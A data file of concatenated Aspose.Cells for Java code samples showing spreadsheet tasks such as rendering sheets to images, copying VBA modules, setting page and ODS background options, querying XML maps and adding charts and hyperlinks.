name,code
 System.out.println(""Aspose.Cells for Java Version: "" + CellsHelper.getVersion());


 //String srcDir = Utils.Get_SourceDirectory();
 //String outDir = Utils.Get_OutputDirectory();


 //Load sample Excel file containing the external resource e.g. linked image etc.
 Workbook wb = new Workbook(srcDir + ""sampleControlExternalResourcesUsingWorkbookSetting_StreamProvider.xlsx"");


 //Provide your implementation of IStreamProvider
 wb.getSettings().setStreamProvider(new SP());


 //Access first worksheet
 Worksheet ws = wb.getWorksheets().get(0);


 //Specify image or print options, we need one page per sheet and png output
 ImageOrPrintOptions opts = new ImageOrPrintOptions();
 opts.setOnePagePerSheet(true);
 opts.setImageType(ImageType.PNG);


 //Create sheet render by passing required parameters
 SheetRender sr = new SheetRender(ws, opts);


 //Convert your entire worksheet into png image
 sr.toImage(0, outDir + ""outputControlExternalResourcesUsingWorkbookSettingStreamProvider.png"");


 // Print the message
 System.out.println(""ControlExternalResourcesUsingWorkbookSetting_StreamProvider executed successfully."");
}


public static void main(String[] args) throws Exception {
 new ControlExternalResourcesUsingWorkbookSetting_StreamProvider().Run();
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


public class ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage { 


 // Russian Globalization
 class RussianGlobalization extends GlobalizationSettings {
 public String getErrorValueString(String err) {
 switch (err.toUpperCase()) {
 case ""#NAME?"":
 return ""#RussianName-�ڬެ�?"";


			}


 return ""RussianError-���ڬҬܬ�"";
		}


 public String getBooleanValueString(Boolean bv) {
 return bv ? ""RussianTrue-���ѬӬլ�"" : ""RussianFalse-�ݬ�ج߬���"";
		}
	}


 public void Run() throws Exception {
 System.out.println(""Aspose.Cells for Java Version: "" + CellsHelper.getVersion());


 String srcDir = Utils.Get_SourceDirectory();
 String outDir = Utils.Get_OutputDirectory();


 // Load the source workbook
 Workbook wb = new Workbook(srcDir + ""sampleRussianGlobalization.xlsx"");


 // Set GlobalizationSettings in Russian Language
 wb.getSettings().setGlobalizationSettings(new RussianGlobalization());


 // Calculate the formula
 wb.calculateFormula();


 // Save the workbook in pdf format
 wb.save(outDir + ""outputRussianGlobalization.pdf"");
	}


 public static void main(String[] args) throws Exception {


 ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage impErr = new ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage();
 impErr.Run();
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Define variables
String name = ""HasFormula"";
String value = ""=GET.CELL(48, INDIRECT(\""ZS\"",FALSE))"";


// Load the template file
Workbook wbSource = new Workbook(srcDir + ""sampleNamedRangeTest.xlsm"");
 
// Get the worksheets collection
WorksheetCollection wsCol = wbSource.getWorksheets();


// Add new name to the names collection
int nameIndex = wsCol.getNames().add(name);
 
// Set value to the named range
Name namedRange = wsCol.getNames().get(nameIndex);
namedRange.setRefersTo(value);


// Save the output file
wbSource.save(outDir + ""sampleOutputNamedRangeTest.xlsm"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create empty target workbook
Workbook target = new Workbook();
 
//Load the Excel file containing VBA-Macro Designer User Form
Workbook templateFile = new Workbook(srcDir + ""sampleDesignerForm.xlsm"");
 
//Copy all template worksheets to target workboook
int sheetCount = templateFile.getWorksheets().getCount();


for(int idx=0; idx<sheetCount; idx++)
{
 Worksheet ws = templateFile.getWorksheets().get(idx);
 
 if (ws.getType() == SheetType.WORKSHEET)
	{
 Worksheet s = target.getWorksheets().add(ws.getName());
 s.copy(ws);
 
 //Put message in cell A2 of the target worksheet
 s.getCells().get(""A2"").putValue(""VBA Macro and User Form copied from template to target."");
	}
}//for
 
//-----------------------------------------------
 
//Copy the VBA-Macro Designer UserForm from Template to Target
int modCount = templateFile.getWorksheets().getCount();


for(int idx=0; idx<modCount; idx++)
{
 VbaModule vbaItem = templateFile.getVbaProject().getModules().get(idx);
 
 if (vbaItem.getName().equals(""ThisWorkbook""))
	{
 //Copy ThisWorkbook module code
 target.getVbaProject().getModules().get(""ThisWorkbook"").setCodes(vbaItem.getCodes());
	}
 else
	{
 //Copy other modules code and data
 System.out.println(vbaItem.getName());
 
 int vbaMod = 0;
 Worksheet sheet = target.getWorksheets().getSheetByCodeName(vbaItem.getName());
 if (sheet == null)
		{
 vbaMod = target.getVbaProject().getModules().add(vbaItem.getType(), vbaItem.getName());
		}
 else
		{
 vbaMod = target.getVbaProject().getModules().add(sheet);
		}
 
 target.getVbaProject().getModules().get(vbaMod).setCodes(vbaItem.getCodes());
 
 if ((vbaItem.getType() == VbaModuleType.DESIGNER))
		{
 //Get the data of the user form i.e. designer storage
 byte[] designerStorage = templateFile.getVbaProject().getModules().getDesignerStorage(vbaItem.getName());
 
 //Add the designer storage to target Vba Project
 target.getVbaProject().getModules().addDesignerStorage(vbaItem.getName(), designerStorage);
		}
	}//else
}//for
 
//Save the target workbook
target.save(outDir + ""outputDesignerForm.xlsm"", SaveFormat.XLSM);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CountNumberOfCells.class) + ""Worksheets/"";
//Load source Excel file
Workbook workbook = new Workbook(dataDir + ""BookWithSomeData.xlsx"");


//Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


//Print number of cells in the Worksheet
System.out.println(""Number of Cells: "" + worksheet.getCells().getCount());


// If the number of cells is greater than 2147483647, use CountLarge
System.out.println(""Number of Cells (CountLarge): "" + worksheet.getCells().getCountLarge());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CountNumberOfCells.class) + ""Worksheets/"";
// Instantiating a Workbook object
Workbook workbook = new Workbook();
Worksheet worksheet = workbook.getWorksheets().get(0);


worksheet.getCells().get(0, 2).setValue(1);
worksheet.getCells().get(1, 2).setValue(2);
worksheet.getCells().get(2, 2).setValue(3);
worksheet.getCells().get(2, 3).setValue(4);
worksheet.getCells().createRange(0, 2, 3, 1).setName(""NamedRange"");


Range cut = worksheet.getCells().createRange(""C:C"");
worksheet.getCells().insertCutCells(cut, 0, 1, ShiftType.RIGHT);
workbook.save(dataDir + ""CutAndPasteCells.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//directories
String sourceDir = Utils.Get_SourceDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook(sourceDir + ""SampleBook1.ods"");


// Add a page break at cell Y30
WorksheetCollection worksheets = workbook.getWorksheets();
Worksheet worksheet = worksheets.get(0);


Cell cell = worksheet.getCells().get(""A9"");


if(cell.getValidation() != null)
{
 System.out.println(cell.getValidation().getType());
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


// Load source Excel file
Workbook workbook = new Workbook(sourceDir + ""Book1.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Print Unique Id
System.out.println(""Unique Id: "" + worksheet.getUniqueId());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Converting integer enums to string enums
HashMap<Integer, String> paperSizeTypes = new HashMap<Integer, String>();
paperSizeTypes.put(PaperSizeType.PAPER_A_3_EXTRA_TRANSVERSE, ""PAPER_A_3_EXTRA_TRANSVERSE"");
paperSizeTypes.put(PaperSizeType.PAPER_LETTER, ""PAPER_LETTER"");
 
//Create workbook
Workbook wb = new Workbook();
 
//Add two test worksheets
wb.getWorksheets().add(""TestSheet1"");
wb.getWorksheets().add(""TestSheet2"");
 
//Access both worksheets as TestSheet1 and TestSheet2
Worksheet TestSheet1 = wb.getWorksheets().get(""TestSheet1"");
Worksheet TestSheet2 = wb.getWorksheets().get(""TestSheet2"");
 
//Set the Paper Size of TestSheet1 to PaperA3ExtraTransverse
TestSheet1.getPageSetup().setPaperSize(PaperSizeType.PAPER_A_3_EXTRA_TRANSVERSE);
 
//Print the Paper Size of both worksheets
System.out.println(""Before Paper Size: "" + paperSizeTypes.get(TestSheet1.getPageSetup().getPaperSize()));
System.out.println(""Before Paper Size: "" + paperSizeTypes.get(TestSheet2.getPageSetup().getPaperSize()));
System.out.println();
 
//Copy the PageSetup from TestSheet1 to TestSheet2
TestSheet2.getPageSetup().copy(TestSheet1.getPageSetup(), new CopyOptions());
 
//Print the Paper Size of both worksheets
System.out.println(""After Paper Size: "" + paperSizeTypes.get(TestSheet1.getPageSetup().getPaperSize()));
System.out.println(""After Paper Size: "" + paperSizeTypes.get(TestSheet2.getPageSetup().getPaperSize()));
System.out.println();
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load the first workbook having automatic paper size false
Workbook wb1 = new Workbook(srcDir + ""samplePageSetupIsAutomaticPaperSize-False.xlsx"");


// Load the second workbook having automatic paper size true
Workbook wb2 = new Workbook(srcDir + ""samplePageSetupIsAutomaticPaperSize-True.xlsx"");


// Access first worksheet of both workbooks
Worksheet ws11 = wb1.getWorksheets().get(0);
Worksheet ws12 = wb2.getWorksheets().get(0);


// Print the PageSetup.IsAutomaticPaperSize property of both worksheets
System.out.println(""First Worksheet of First Workbook - IsAutomaticPaperSize: "" + ws11.getPageSetup().isAutomaticPaperSize());
System.out.println(""First Worksheet of Second Workbook - IsAutomaticPaperSize: "" + ws12.getPageSetup().isAutomaticPaperSize());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create workbook object
Workbook wb = new Workbook();
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Set custom paper size in unit of inches
ws.getPageSetup().customPaperSize(6, 4);
 
//Access cell B4
Cell b4 = ws.getCells().get(""B4"");
 
//Add the message in cell B4
b4.putValue(""Pdf Page Dimensions: 6.00 x 4.00 in"");
 
//Save the workbook in pdf format
wb.save(outDir + ""outputCustomPaperSize.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(srcDir + ""sampleRemoveExistingPrinterSettingsOfWorksheets.xlsx"");
 
//Get the sheet counts of the workbook
int sheetCount = wb.getWorksheets().getCount();
 
//Iterate all sheets
for(int i=0; i<sheetCount; i++)
{
 //Access the i-th worksheet
 Worksheet ws = wb.getWorksheets().get(i);
 
 //Access worksheet page setup
 PageSetup ps = ws.getPageSetup();
 
 //Check if printer settings for this worksheet exist
 if(ps.getPrinterSettings() != null)
	{
 //Print the following message
 System.out.println(""PrinterSettings of this worksheet exist."");
 
 //Print sheet name and its paper size
 System.out.println(""Sheet Name: "" + ws.getName());
 System.out.println(""Paper Size: "" + ps.getPaperSize());
 
 //Remove the printer settings by setting them null
 ps.setPrinterSettings(null);
 System.out.println(""Printer settings of this worksheet are now removed by setting it null."");
 System.out.println("""");
	}//if
}//for
 
//Save the workbook
wb.save(outDir + ""outputRemoveExistingPrinterSettingsOfWorksheets.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public static void main(String[] args) throws Exception {
 // The path to the source directory.
 String sourceDir = Utils.Get_SourceDirectory();
 // The path to the output directory.
 String outDir = Utils.Get_OutputDirectory();


 //Load source Excel file
 Workbook workbook = new Workbook(sourceDir + ""GraphicBackground.ods"");


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();


 System.out.println(""Background Type: "" + getTypeValue(background.getType()));
 System.out.println(""Backgorund Position: "" + getPositionValue(background.getGraphicPositionType()));


 //Save background image
 
 ByteArrayInputStream stream = new ByteArrayInputStream(background.getGraphicData());
 BufferedImage image = ImageIO.read(stream);
 ImageIO.write(image, ""png"", new File(outDir + ""background.png""));


 System.out.println(""ReadODSBackground executed successfully."");        
}
 
public static String getTypeValue(int type) {
 String value = """";
 if(type == OdsPageBackgroundType.COLOR) {
 value = ""COLOR"";
	} else if(type == OdsPageBackgroundType.GRAPHIC) {
 value = ""GRAPHIC"";
	} else if(type == OdsPageBackgroundType.NONE) {
 value = ""NONE"";
	}
 return value;
}
 
public static String getPositionValue(int position) {
 String value = """";
 if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_CENTER) {
 value = ""BOTTOM_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_LEFT) {
 value = ""BOTTOM_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_RIGHT) {
 value = ""BOTTOM_RIGHT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_CENTER) {
 value = ""CENTER_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_LEFT) {
 value = ""CENTER_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_RIGHT) {
 value = ""CENTER_RIGHT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_CENTER) {
 value = ""TOP_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_LEFT) {
 value = ""TOP_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_RIGHT) {
 value = ""TOP_RIGHT"";
	}
 return value;
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String outDir = Utils.Get_OutputDirectory();
 
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 worksheet.getCells().get(0, 0).setValue(1);
 worksheet.getCells().get(1, 0).setValue(2);
 worksheet.getCells().get(2, 0).setValue(3);
 worksheet.getCells().get(3, 0).setValue(4);
 worksheet.getCells().get(4, 0).setValue(5);
 worksheet.getCells().get(5, 0).setValue(6);
 worksheet.getCells().get(0, 1).setValue(7);
 worksheet.getCells().get(1, 1).setValue(8);
 worksheet.getCells().get(2, 1).setValue(9);
 worksheet.getCells().get(3, 1).setValue(10);
 worksheet.getCells().get(4, 1).setValue(11);
 worksheet.getCells().get(5, 1).setValue(12);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();


 background.setColor(Color.getAzure());
 background.setType(OdsPageBackgroundType.COLOR);


 workbook.save(outDir + ""ColoredBackground.ods"", SaveFormat.ODS);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();
// The path to the output directory.
String outDir = Utils.Get_OutputDirectory();
 
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 worksheet.getCells().get(0, 0).setValue(1);
 worksheet.getCells().get(1, 0).setValue(2);
 worksheet.getCells().get(2, 0).setValue(3);
 worksheet.getCells().get(3, 0).setValue(4);
 worksheet.getCells().get(4, 0).setValue(5);
 worksheet.getCells().get(5, 0).setValue(6);
 worksheet.getCells().get(0, 1).setValue(7);
 worksheet.getCells().get(1, 1).setValue(8);
 worksheet.getCells().get(2, 1).setValue(9);
 worksheet.getCells().get(3, 1).setValue(10);
 worksheet.getCells().get(4, 1).setValue(11);
 worksheet.getCells().get(5, 1).setValue(12);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();
 
 BufferedImage image = ImageIO.read(new File(sourceDir + ""background.png""));
 ByteArrayOutputStream bos = new ByteArrayOutputStream();
 ImageIO.write(image, ""png"", bos );
 byte [] imageData = bos.toByteArray();


 background.setType(OdsPageBackgroundType.GRAPHIC);
 background.setGraphicData(imageData);
 background.setGraphicType(OdsPageBackgroundGraphicType.AREA);


 workbook.save(outDir + ""GraphicBackground.ods"", SaveFormat.ODS);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(""sampleSheetId.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Print its Sheet or Tab Id on console
System.out.println(""Sheet or Tab Id: "" + ws.getTabId());
 
//Change Sheet or Tab Id
ws.setTabId(358);
 
//Save the workbook
wb.save(""outputSheetId.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load sample Excel file having Xml Map
Workbook wb = new Workbook(""sampleRootElementNameOfXmlMap.xlsx"");
 
//Access first Xml Map inside the Workbook
XmlMap xmap = wb.getWorksheets().getXmlMaps().get(0);
 
//Print Root Element Name of Xml Map on Console
System.out.println(""Root Element Name Of Xml Map: "" + xmap.getRootElementName());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
// Load XLSX file containing data from XML file
Workbook workbook = new Workbook(""XML Data.xlsx"");


// Access the first worksheet
Worksheet ws = workbook.getWorksheets().get(0);


// Access ListObject from the first sheet
ListObject listObject = ws.getListObjects().get(0);


// Get the url of the list object's xml map data binding
String url = listObject.getXmlMap().getDataBinding().getUrl();


// Display XML file name
System.out.println(url);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Load sample Excel file having Xml Map
Workbook wb = new Workbook(""sampleXmlMapQuery.xlsx"");
 
//Access first XML Map
XmlMap xmap = wb.getWorksheets().getXmlMaps().get(0);
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Query Xml Map from Path - /MiscData
System.out.println(""Query Xml Map from Path - /MiscData"");
ArrayList ret = ws.xmlMapQuery(""/MiscData"", xmap);
 
//Print returned ArrayList values
for (int i = 0; i < ret.size(); i++)
{
 System.out.println(ret.get(i));
}
 
System.out.println("""");
 
//Query Xml Map from Path - /MiscData/row/Color
System.out.println(""Query Xml Map from Path - /MiscData/row/Color"");
ret = ws.xmlMapQuery(""/MiscData/row/Color"", xmap);
 
//Print returned ArrayList values
for (int i = 0; i < ret.size(); i++)
{
 System.out.println(ret.get(i));
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessAndUpdatePortions.class);


Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


Cell cell = worksheet.getCells().get(""A1"");


System.out.println(""Before updating the font settings...."");


FontSetting[] fnts = cell.getCharacters();


for (int i = 0; i < fnts.length; i++) {
 System.out.println(fnts[i].getFont().getName());
}


// Modify the first FontSetting Font Name
fnts[0].getFont().setName(""Arial"");


// And update it using SetCharacters() method
cell.setCharacters(fnts);


System.out.println();


System.out.println(""After updating the font settings...."");


fnts = cell.getCharacters();


for (int i = 0; i < fnts.length; i++) {
 System.out.println(fnts[i].getFont().getName());
}


// Save workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessingTablefromCell.class);
// Create workbook from source Excel file
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access cell D5 which lies inside the table
Cell cell = worksheet.getCells().get(""D5"");


// Put value inside the cell D5
cell.putValue(""D5 Data"");


// Access the Table from this cell
ListObject table = cell.getTable();


// Add some value using Row and Column Offset
table.putCellValue(2, 2, ""Offset [2,2]"");


// Save the workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessTextBoxName.class);


Workbook workbook = new Workbook();


Worksheet sheet = workbook.getWorksheets().get(0);


int idx = sheet.getTextBoxes().add(10, 10, 10, 10);


// Create a texbox with some text and assign it some name
TextBox tb1 = sheet.getTextBoxes().get(idx);
tb1.setName(""MyTextBox"");
tb1.setText(""This is MyTextBox"");


// Access the same textbox via its name
TextBox tb2 = sheet.getTextBoxes().get(""MyTextBox"");


// Displaying the text of the textbox accessed by its name
System.out.println(tb2.getText());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ActivatingSheetsandActivatingCell.class);
// Instantiate a new Workbook
Workbook workbook = new Workbook();
// Get the first worksheet in the workbook
Worksheet worksheet = workbook.getWorksheets().get(0);
// Get the cells in the worksheet
Cells cells = worksheet.getCells();
// Input data into B2 cell
cells.get(1, 1).putValue(""Hello World!"");
// Set the first sheet as an active sheet
workbook.getWorksheets().setActiveSheetIndex(0);
// Set B2 cell as an active cell in the worksheet
worksheet.setActiveCell(""B2"");
// Set the B column as the first visible column in the worksheet
worksheet.setFirstVisibleColumn(1);
// Set the 2nd row as the first visible row in the worksheet
worksheet.setFirstVisibleRow(1);
// Save the excel file
workbook.save(dataDir + ""activecell.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddActiveXControl.class);
// Create workbook object
Workbook wb = new Workbook();


// Access first worksheet
Worksheet sheet = wb.getWorksheets().get(0);


// Add Toggle Button ActiveX Control inside the Shape Collection
Shape s = sheet.getShapes().addActiveXControl(ControlType.TOGGLE_BUTTON, 4, 0, 4, 0, 100, 30);


// Access the ActiveX control object and set its linked cell property
ActiveXControl c = s.getActiveXControl();
c.setLinkedCell(""A1"");


// Save the worbook in xlsx format
wb.save(dataDir + ""output.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddConditionalIconsSet.class);
// Instantiate an instance of Workbook
Workbook workbook = new Workbook();
// Get the first worksheet (default worksheet) in the workbook
Worksheet worksheet = workbook.getWorksheets().get(0);
// Get the cells
Cells cells = worksheet.getCells();
// Set the columns widths (A, B and C)
worksheet.getCells().setColumnWidth(0, 24);
worksheet.getCells().setColumnWidth(1, 24);
worksheet.getCells().setColumnWidth(2, 24);


// Input date into the cells
cells.get(""A1"").setValue(""KPIs"");
cells.get(""A2"").setValue(""Total Turnover (Sales at List)"");
cells.get(""A3"").setValue(""Total Gross Margin %"");
cells.get(""A4"").setValue(""Total Net Margin %"");
cells.get(""B1"").setValue(""UA Contract Size Group 4"");
cells.get(""B2"").setValue(19551794);
cells.get(""B3"").setValue(11.8070745566204);
cells.get(""B4"").setValue(11.858589818569);
cells.get(""C1"").setValue(""UA Contract Size Group 3"");
cells.get(""C2"").setValue(8150131.66666667);
cells.get(""C3"").setValue(10.3168384396244);
cells.get(""C4"").setValue(11.3326931937091);


// Get the conditional icon's image data
byte[] imagedata = ConditionalFormattingIcon.getIconImageData(IconSetType.TRAFFIC_LIGHTS_31, 0);
// Create a stream based on the image data
ByteArrayInputStream stream = new ByteArrayInputStream(imagedata);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(1, 1, stream);


// Get the conditional icon's image data
byte[] imagedata1 = ConditionalFormattingIcon.getIconImageData(IconSetType.ARROWS_3, 2);
// Create a stream based on the image data
ByteArrayInputStream stream1 = new ByteArrayInputStream(imagedata1);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(1, 2, stream1);


// Get the conditional icon's image data
byte[] imagedata2 = ConditionalFormattingIcon.getIconImageData(IconSetType.SYMBOLS_3, 0);
// Create a stream based on the image data
ByteArrayInputStream stream2 = new ByteArrayInputStream(imagedata2);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(2, 1, stream2);


// Get the conditional icon's image data
byte[] imagedata3 = ConditionalFormattingIcon.getIconImageData(IconSetType.STARS_3, 0);
// Create a stream based on the image data
ByteArrayInputStream stream3 = new ByteArrayInputStream(imagedata3);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(2, 2, stream3);


// Get the conditional icon's image data
byte[] imagedata4 = ConditionalFormattingIcon.getIconImageData(IconSetType.BOXES_5, 1);
// Create a stream based on the image data
ByteArrayInputStream stream4 = new ByteArrayInputStream(imagedata4);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(3, 1, stream4);


// Get the conditional icon's image data
byte[] imagedata5 = ConditionalFormattingIcon.getIconImageData(IconSetType.FLAGS_3, 1);
// Create a stream based on the image data
ByteArrayInputStream stream5 = new ByteArrayInputStream(imagedata5);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(3, 2, stream5);


// Save the Excel file
workbook.save(dataDir + ""outfile_cond_icons1.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddCustomLabelsToDataPoints.class);
Workbook workbook = new Workbook(FileFormatType.XLSX);
Worksheet sheet = workbook.getWorksheets().get(0);


// Put data
sheet.getCells().get(0, 0).putValue(1);
sheet.getCells().get(0, 1).putValue(2);
sheet.getCells().get(0, 2).putValue(3);


sheet.getCells().get(1, 0).putValue(4);
sheet.getCells().get(1, 1).putValue(5);
sheet.getCells().get(1, 2).putValue(6);


sheet.getCells().get(2, 0).putValue(7);
sheet.getCells().get(2, 1).putValue(8);
sheet.getCells().get(2, 2).putValue(9);


// Generate the chart
int chartIndex = sheet.getCharts().add(ChartType.SCATTER_CONNECTED_BY_LINES_WITH_DATA_MARKER, 5, 1, 24, 10);
Chart chart = sheet.getCharts().get(chartIndex);


chart.getTitle().setText(""Test"");
chart.getCategoryAxis().getTitle().setText(""X-Axis"");
chart.getValueAxis().getTitle().setText(""Y-Axis"");


chart.getNSeries().setCategoryData(""A1:C1"");


// Insert series
chart.getNSeries().add(""A2:C2"", false);


Series series = chart.getNSeries().get(0);


int pointCount = series.getPoints().getCount();
for (int i = 0; i < pointCount; i++) {
 ChartPoint pointIndex = series.getPoints().get(i);


 pointIndex.getDataLabels().setText(""Series 1"" + ""\n"" + ""Point "" + i);
}


// Insert series
chart.getNSeries().add(""A3:C3"", false);


series = chart.getNSeries().get(1);


pointCount = series.getPoints().getCount();
for (int i = 0; i < pointCount; i++) {
 ChartPoint pointIndex = series.getPoints().get(i);


 pointIndex.getDataLabels().setText(""Series 2"" + ""\n"" + ""Point "" + i);
}


workbook.save(dataDir + ""Test.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(AddImageHyperlinks.class);


// Instantiate a new workbook
Workbook workbook = new Workbook();


// Get the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Insert a string value to a cell
worksheet.getCells().get(""C2"").setValue(""Image Hyperlink"");


// Set the 4th row height
worksheet.getCells().setRowHeight(3, 100);


// Set the C column width
worksheet.getCells().setColumnWidth(2, 21);


// Add a picture to the C4 cell
int index = worksheet.getPictures().add(3, 2, 4, 3, dataDir + ""aspose-logo.jpg"");


// Get the picture object
com.aspose.cells.Picture pic = worksheet.getPictures().get(index);


// Set the placement type
pic.setPlacement(PlacementType.FREE_FLOATING);


// Add an image hyperlink
pic.addHyperlink(""http://www.aspose.com/"");
com.aspose.cells.Hyperlink hlink = pic.getHyperlink();


// Specify the screen tip
hlink.setScreenTip(""Click to go to Aspose site"");


// Save the Excel file
workbook.save(dataDir + ""ImageHyperlink.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
